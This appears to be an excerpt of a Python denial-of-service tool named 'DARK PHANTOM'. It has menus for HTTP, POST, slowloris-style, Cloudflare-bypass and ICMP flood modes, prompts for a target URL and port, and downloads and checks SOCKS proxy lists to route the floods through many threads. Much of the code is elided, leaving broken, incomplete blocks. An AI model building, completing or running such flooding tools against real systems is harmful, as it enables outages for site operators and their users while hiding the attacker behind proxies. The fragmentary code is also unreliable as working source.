...
TEAM : TSA 
DEVELOPER : ASIF HASSAN 
VERSION : DARK PHANTOM 
""")
#===================[USER-AGENTS]===================
	...
	while True:
		try:
			...
			try:
				...
				s.close()
			print ("Packet Sent From "+str(proxy[0])+":"+str(proxy[1]))
		except:
			s.close()
...
def slow(conn,socks_type):
	...
	for _ in range(conn):
		try:
			...
			sys.stdout.write("Connections : "+str(len(socket_list))+"\r")
			sys.stdout.flush()
		except:
			s.close()
			proxy = Choice(proxies).strip().split(":")
...
def check_socks(ms):
	...
	for lines in list(proxies):
		...
		time.sleep(0.01)
		sys.stdout.write(str(nums)+"Proxies Checked !")
		sys.stdout.flush()
	for th in list(thread_list):
		th.join()
		sys.stdout.write(str(nums)+"Proxies Checked !")
		sys.stdout.flush()
	print("Good Proxies : "+str(len(proxies)))
	ans = input("Do You Want to save list? [y=yes, *=no] » ")
	if ans == "y" or ans == "":
		if choice == "4":
			...
			fp.close()
			print("New list has saved at socks4.txt !")
		elif choice == "5":
			with open("socks5.txt", 'wb') as fp:
				for lines in list(proxies):
					fp.write(bytes(lines,encoding='utf8'))
			fp.close()
			print("New list has saved at socks5.txt !")
...
''')
	while method_name(mode) == "" :
		...
		if mode == "icmp":
			icmpflood()
		elif(mode != "http") and (mode != "post")and (mode != "head")and(mode != "slow")and(mode != "hdr" )and(mode != "cfb" ):
			print ('Error , Please Try Again !')
			mode = ""
			continue
	ip = str(input("Enter the URL / IP » "))
	if ip == "":
		print("Enter the URL / IP » ")
		sys.exit(1)
	if mode == "slow" or mode == "check":
		pass
	else:
		url = str(input("Enter the Target page » "))
		if url == "":
			url2 = "/"
		else:
			url2 = url
	port = str(input("Enter the Attack port » "))
	if port == '':
		port = int(80)
		print("80 Port Automaticly Selected !")
	else:
		port = int(port)
		if str(port) == '443':
			print("443 Port Selected !")
	if mode == "post":
		mode2 = str(input("Do You Want to use Custom Post Data? [y=yes,*=no] » ")).strip()
		if mode2 == "y":
			data = open(input("Enter Data File's path » ").strip()).readlines()
			data = ' '.join([str(txt) for txt in data])
	choice = ""
	while choice == "":
		choice = str(input("Enter Attack Proxies Type [4=Socks4 5=Socks5] »")).strip()
		if choice == "":
			choice = "5"
		...
		if choice == "4":
			...
			socks_type = 5
	if mode == "check":
		N = str(input("Do You Need New Proxylist? [y=download *=no] » "))
		if N == 'y' or N == "" :
			downloadsocks(choice)
		else:
			pass
		if choice == "4":
			out_file = str(input("Enter Proxies List file name (socks4.txt) » "))
			if out_file == '':
			...
			out_file = str(input("Enter Proxies List file name (socks5.txt) » "))
			if out_file == '':
			...
			check_list(out_file)
			proxies = open(out_file).readlines()
		print ("Socks%s Count = %s"  %(choice,len(proxies)))
		time.sleep(0.03)
		ans = str(input("Do You Want to Check Proxies? (Y=Yes, *= No) » "))
		if ans == "":
			ans = "y"
		if ans == "y":
			ms = str(input("Enter The Check Operation Speed (default=1) » "))
			if ms == "":
				ms = int(1)
			else :
				try:
		...
		return
	if mode == "slow":
		thread_num = str(input("Enter Attack Connections Count (400) » "))
	else:
		thread_num = str(input("Enter Attack Speed (400) » "))
	if thread_num == "":
		thread_num = int(400)
	else:
		try:
			...
			sys.exit("Error in Thread Numbers !")
	N = str(input("Do You Need New Proxylist? [y=download *=no] » "))
	if N == 'y' or N == "" :
		downloadsocks(choice)
	else:
	...
	if mode == "slow":
		...
		multiple = str(input("Enter the input size [(1-5=normal) (50=powerful) (100 or more=Bomb)] » "))
		if multiple == "":
			multiple = int(100)
		else:
			multiple = int(multiple)
		brute = str(input("Press Enter To Build Threads"))
		if brute == "":
			brute = False
		elif brute == "y":
			brute = True
...
def numthreads():
	global threads
	try:
		threads = int(input("Enter Attack Speed (600) » "))
	except ValueError:
		threads = 600
		print ("\nAttack Speed Has Saved !\n")
	multiplication()
def multiplication():
	global multiple
	try:
		multiple = int(input("Enter The input size [(1-5=normal)(50=powerful)(100 or more=bomb)] » "))
	except ValueError:
		print ('Error , Please Try Again !')
		multiplication()
	begin()
...
def opth():
	for a in range(thr):
		...
		x.start()
		print (str(a+1) + "Threads Has Created !")
...
def cfbattack():
	...
	global per
	url = str(input("\nEnter target URL / IP » "))
	ssl = str(input("\nDoes Target Has SSL? [y=yes, n=no] » "))
	ge = str(input("\nDo You Need New Proxylist? [y=download n=no] » "))
	if ge =='y':
		if ssl == 'y':
		...
		pass
	list = str(input("Enter Proxies List file name (proxy.txt) » "))
	pprr = open(list).readlines()
	print("Proxies Count = %d" %len(pprr))
	thr = int(input("Enter Attack Speed (300) » "))
	per = int(input("Enter Input size [(1-5=normal)(50=powerful)(max=100)] » "))
	opth()
def atk():
	pprr = open(list).readlines()
